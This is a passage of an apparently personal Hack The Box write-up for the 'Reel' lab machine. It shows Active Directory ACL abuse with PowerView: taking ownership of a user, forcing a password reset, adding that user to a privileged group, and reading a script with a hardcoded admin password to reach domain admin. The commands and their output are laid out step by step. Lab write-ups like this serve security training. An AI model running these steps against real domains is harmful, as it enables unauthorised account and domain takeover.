+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+tom@REEL C:\Users\tom&gt;</code></pre><p>I now have access via SSH</p><p>An alternative could have been to upload RunAsCs via meterpreter session then i could execute commands as <code>tom</code></p><p>Found an interesting directory in toms desktop called <code>AD Audit</code> inside i find a note as well as powerview.ps1 and some bloodhound collection tools</p><h4>note.txt</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">scp tom@reel.htb.local:C:/Users/tom/Desktop/AD\ Audit/note.txt .
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+tom@reel.htb.local&#39;s password: 
+note.txt</code></pre><p>Ive used scp to copy it to my machine</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat note.txt  
+Findings:
+
+Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).
+
+Maybe we should re-run Cypher query against other groups we&#39;ve created.</code></pre><p>Maybe a hint to try and run bloodhound on here!</p><p>Im going to try and run bloodhound on here ill upload sharphound using scp, since this is an older machine the collector may be out of date so ill upload the new one!</p><h4>acls.csv</h4><p>Found another file in the same location ill transfer it to my machine with scp</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">scp tom@reel.htb.local:C:/Users/tom/Desktop/AD\ Audit/BloodHound/Ingestors/acls.csv .</code></pre><p>This transferred the file</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat acls.csv | grep tom                                                                                                                        
+&quot;tom@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Domain Admins@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;WriteDacl WriteOwner&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;tom@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Enterprise Admins@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;WriteDacl WriteOwner&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;tom@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Administrators@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;WriteDacl WriteOwner&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;tom@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Local System@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;GenericAll&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;tom@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Domain Admins@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;Owner&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;claire@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;tom@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;WriteOwner&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;</code></pre><p>So it looks like the most interesting part from this output is that <code>tom</code> has <code>writeowner</code> over <code>claire</code></p><h2>Granting full control over <code>claire</code> as <code>tom</code></h2><p><a href="https://www.hackingarticles.in/abusing-ad-dacl-writeowner/" target="_blank" rel="noreferrer">https://www.hackingarticles.in/abusing-ad-dacl-writeowner/</a></p><p>Ill use this article to abuse this!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Import-Module .\PowerView.ps1                                                      
+PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Set-DomainObjectOwner -Identity &#39;claire&#39; -OwnerIdentity &#39;tom&#39;
+PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Add-DomainObjectAcl -Rights &#39;All&#39; -TargetIdentity &quot;claire&quot; -PrincipalIdentity &quot;tom&quot;</code></pre><p>This imported powerview which was conveniently already there for me, then made <code>tom</code> the owner of <code>claire</code> from there i could give myself full control over <code>claire</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; $NewPassword = ConvertTo-SecureString &#39;Password1234&#39; -AsPlainText -Force           
+PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Set-DomainUserPassword -Identity &#39;claire&#39; -AccountPassword $NewPassword</code></pre><p>Now i have GenericAll i can just change the password like ive done here</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ssh claire@reel.htb.local                                       
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+claire@reel.htb.local&#39;s password: 
+
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+claire@REEL C:\Users\claire&gt; </code></pre><p>Now i have access to <code>claire</code></p><h3>Analysis of <code>claire</code> rights</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat acls.csv | grep claire
+&quot;Backup_Admins@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;&quot;,&quot;claire@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;WriteDacl&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;claire@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;tom@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;WriteOwner&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;claire@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Domain Admins@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;GenericAll&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;claire@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Account Operators@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;GenericAll&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;claire@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Local System@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;GenericAll&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;claire@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Exchange Windows Permissions@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;ExtendedRight&quot;,&quot;User-Force-Change-Password&quot;,&quot;AccessAllowed&quot;,&quot;True&quot;
+&quot;claire@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Exchange Windows Permissions@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;WriteProperty&quot;,&quot;Member&quot;,&quot;AccessAllowed&quot;,&quot;True&quot;
+&quot;claire@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Exchange Windows Permissions@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;WriteDacl&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;True&quot;
+&quot;claire@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Exchange Windows Permissions@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;WriteDacl&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;True&quot;
+&quot;claire@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Enterprise Admins@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;GenericAll&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;True&quot;
+&quot;claire@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Administrators@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;WriteDacl WriteOwner&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;True&quot;
+&quot;claire@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Local System@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;Owner&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;claire_da@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Domain Admins@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;WriteDacl WriteOwner&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;claire_da@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Enterprise Admins@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;WriteDacl WriteOwner&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;claire_da@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Administrators@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;WriteDacl WriteOwner&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;claire_da@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Local System@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;GenericAll&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;
+&quot;claire_da@HTB.LOCAL&quot;,&quot;USER&quot;,&quot;&quot;,&quot;Domain Admins@HTB.LOCAL&quot;,&quot;GROUP&quot;,&quot;Owner&quot;,&quot;&quot;,&quot;AccessAllowed&quot;,&quot;False&quot;</code></pre><p>As seen here at the top of the output <code>claire</code> has WriteDacl over the backup admins group</p><p>So the same thing really i can grant myself GenericAll with WriteDacl then add myself to backup admins then from there im assuming i can backup SAM and SYSTEM</p><h2>Adding <code>claire</code> to <code>backup_admins</code></h2><p><a href="https://www.hackingarticles.in/abusing-ad-dacl-writedacl/" target="_blank" rel="noreferrer">https://www.hackingarticles.in/abusing-ad-dacl-writedacl/</a></p><p>Ill use this article to help with this</p><p>First ill need to upload PowerView to claire</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">scp PowerView.ps1 claire@reel.htb.local:C:/Users/claire/Desktop/
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+claire@reel.htb.local&#39;s password: 
+PowerView.ps1</code></pre><p>Now its on her desktop i can give GenericAll to myself over the backup admins group</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\claire\Desktop&gt; powershell -ep bypass                                                                               
+Windows PowerShell                                                                                                              
+Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  
+
+PS C:\Users\claire\Desktop&gt; Import-Module .\PowerView.ps1
+PS C:\Users\claire\Desktop&gt; Add-DomainObjectAcl -Rights &#39;All&#39; -TargetIdentity &quot;Backup_Admins&quot; -PrincipalIdentity &quot;claire&quot;</code></pre><p>Now i should have GenericAll over the group now i can add myself to it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\claire\Desktop&gt; net group &quot;Backup_Admins&quot; claire /add /domain                                                       
+The command completed successfully.</code></pre><p>Now im in the group</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\claire&gt; net user claire                                                                                             
+User name                    claire                                                                                             
+Full Name                    Claire Danes                                                                                       
+Comment                                                                                                                         
+User&#39;s comment                                                                                                                  
+Country/region code          000 (System Default)                                                                               
+Account active               Yes                                                                                                
+Account expires              Never                                                                                              
+
+Password last set            4/9/2026 6:28:40 PM                                                                                
+Password expires             Never                                                                                              
+Password changeable          4/10/2026 6:28:40 PM                                                                               
+Password required            Yes                                                                                                
+User may change password     Yes                                                                                                
+
+Workstations allowed         All                                                                                                
+Logon script                                                                                                                    
+User profile                                                                                                                    
+Home directory                                                                                                                  
+Last logon                   4/9/2026 6:28:46 PM                                                                                
+
+Logon hours allowed          All                                                                                                
+
+Local Group Memberships      *Hyper-V Administrator                                                                             
+Global Group memberships     *Backup_Admins        *Domain Users                                                                
+                             *MegaBank_Users       *DR_Site                                                                     
+                             *Restrictions                                                                                      
+The command completed successfully.</code></pre><p>Now im in the Backup_Admins group</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\Administrator\Desktop\Backup Scripts&gt; type BackupScript.ps1                                                         
+# admin password                                                                                                                
+$password=&quot;Cr4ckMeIfYouC4n!&quot;       
+...[SNIP]...</code></pre><p>So i can read some of the administrator files and found this backup script with hardcoded credentials</p><h2>Domain admin!</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ssh administrator@reel.htb.local                                
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+administrator@reel.htb.local&#39;s password: 
+
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+administrator@REEL C:\Users\Administrator&gt;cd Desktop                                                                            
+
+administrator@REEL C:\Users\Administrator\Desktop&gt;dir                                                                           
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is CEBA-B613                                                                                              
+
+ Directory of C:\Users\Administrator\Desktop                                                                                    
+
+21/01/2018  15:56    &lt;DIR&gt;          .                                                                                           
+21/01/2018  15:56    &lt;DIR&gt;          ..                                                                                          
+02/11/2017  22:47    &lt;DIR&gt;          Backup Scripts                                                                              
+09/04/2026  16:16                34 root.txt                                                                                    
+               1 File(s)             34 bytes                                                                                   
+               3 Dir(s)   4,976,431,104 bytes free                                                                              
+
+administrator@REEL C:\Users\Administrator\Desktop&gt;type root.txt                                                                 
+
+
+administrator@REEL C:\Users\Administrator\Desktop&gt;whoami /priv                                                                  
+
+PRIVILEGES INFORMATION                                                                                                          
+----------------------                                                                                                          
+
+Privilege Name                  Description                                                    State                            
+=============================== ============================================================== =======                          
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process                             Enabled                          
+SeMachineAccountPrivilege       Add workstations to domain                                     Enabled                          
+SeSecurityPrivilege             Manage auditing and security log                               Enabled                          
+SeTakeOwnershipPrivilege        Take ownership of files or other objects                       Enabled                          
+SeLoadDriverPrivilege           Load and unload device drivers                                 Enabled                          
+SeSystemProfilePrivilege        Profile system performance                                     Enabled                          
+SeSystemtimePrivilege           Change the system time                                         Enabled                          
+SeProfileSingleProcessPrivilege Profile single process                                         Enabled                          
+SeIncreaseBasePriorityPrivilege Increase scheduling priority                                   Enabled                          
+SeCreatePagefilePrivilege       Create a pagefile                                              Enabled                          
+SeBackupPrivilege               Back up files and directories                                  Enabled                          
+SeRestorePrivilege              Restore files and directories                                  Enabled                          
+SeShutdownPrivilege             Shut down the system                                           Enabled                          
+SeDebugPrivilege                Debug programs                                                 Enabled                          
+SeSystemEnvironmentPrivilege    Modify firmware environment values                             Enabled                          
+SeChangeNotifyPrivilege         Bypass traverse checking                                       Enabled                          
+SeRemoteShutdownPrivilege       Force shutdown from a remote system                            Enabled                          
+SeUndockPrivilege               Remove computer from docking station                           Enabled                          
+SeEnableDelegationPrivilege     Enable computer and user accounts to be trusted for delegation Enabled                          
+SeManageVolumePrivilege         Perform volume maintenance tasks                               Enabled                          
+SeImpersonatePrivilege          Impersonate a client after authentication                      Enabled                          
+SeCreateGlobalPrivilege         Create global objects                                          Enabled                          
+SeIncreaseWorkingSetPrivilege   Increase a process working set                                 Enabled                          
+SeTimeZonePrivilege             Change the time zone                                           Enabled                          
+SeCreateSymbolicLinkPrivilege   Create symbolic links                                          Enabled                          
+
+administrator@REEL C:\Users\Administrator\Desktop&gt;</code></pre><p>Domain Admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-mantis/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Mantis</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-authority/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Authority</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
